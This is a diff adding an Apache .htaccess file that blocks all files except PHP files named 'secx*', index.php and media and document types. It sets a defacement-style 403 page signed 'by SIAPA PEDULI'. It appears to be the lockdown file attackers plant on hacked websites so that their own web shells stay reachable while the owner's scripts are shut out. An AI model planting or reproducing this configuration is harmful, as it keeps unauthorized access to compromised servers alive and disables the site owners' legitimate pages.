@@ -1,0 +1,26 @@
+<FilesMatch ".*">
+  Order Deny,Allow
+  Deny from all
+</FilesMatch>
+
+<FilesMatch "^secx.*\.(php|phar|phtml|shtml)$">
+  Order Allow,Deny
+  Allow from all
+</FilesMatch>
+<Files index.php>
+Allow from all
+</Files>
+<FilesMatch "\.(jpg|jpeg|png|gif|svg|bmp|ico|webp|heic)$">
+    Order Deny,Allow
+    Allow from all
+</FilesMatch>
+<FilesMatch "\.(mp4|webm|avi|mov|wmv|mp3|wav|ogv|ogg)$">
+    Order Deny,Allow
+    Allow from all
+</FilesMatch>
+<FilesMatch "\.(pdf|doc|docx|xls|xlsx|zip|rar|tar|gz|ppt|pptx|csv|)$">
+    Order Deny,Allow
+    Allow from all
+</FilesMatch>
+ErrorDocument 403 '<center><img src="https://www.icegif.com/wp-content/uploads/2022/01/icegif-548.gif"></img> <h3>WOOOOPSSS FORBIDDEN</font><br><h2>by SIAPA PEDULI</h2>'
+Options -Indexes
